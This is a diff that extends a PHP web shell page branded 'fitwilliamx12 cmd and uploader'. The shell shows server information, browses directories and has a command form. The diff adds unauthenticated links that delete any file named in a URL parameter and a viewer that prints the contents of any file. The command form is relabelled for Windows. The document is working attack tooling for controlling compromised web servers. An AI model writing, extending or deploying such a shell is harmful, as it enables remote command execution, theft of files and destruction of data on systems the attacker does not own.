@@ -85,7 +85,7 @@
     </style>
 </head>
 <body>
-    <h1>fitwilliamx12 cmd and uploader</h1><a href="https://instagram.com/fitwilliamx12">> Contact me < </a>
+    <h1>fitwilliamx12 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx12">> Contact me < </a><br>
     <!-- System Information Section -->
     <div class="system-info">
         <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
@@ -187,15 +187,38 @@
         foreach ($files as $file) {
             if ($file === '.' || $file === '..') continue;
             $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
+            $fileSize = is_file($filePath) ? filesize($filePath) : '-';
+            $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
+            
+            echo '<div class="file-item">';
             if (is_dir($filePath)) {
-                echo '<div class="file-item">[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a></div>';
+                echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>';
             } else {
-                echo '<div class="file-item">[FILE] ' . htmlspecialchars($file) . '</div>';
+                echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
+                '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>';
+            }
+            echo '</div>';
+        }
+        // File Deletion
+        if (isset($_GET['delete'])) {
+            $deletePath = $_GET['delete'];
+            if (is_file($deletePath) && unlink($deletePath)) {
+                echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
+            } else {
+                echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
+            }
+        }
+        // File Viewing
+        if (isset($_GET['view'])) {
+            $viewPath = $_GET['view'];
+            if (is_file($viewPath)) {
+                echo '<h2>View File</h2>';
+                echo '<pre>' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
             }
         }
         ?>
     </div>
-    <h2>CMD</h2>
+    <h2>CMD [ Windows ]</h2>
     <form method="GET">
         <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
         <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., dir)">
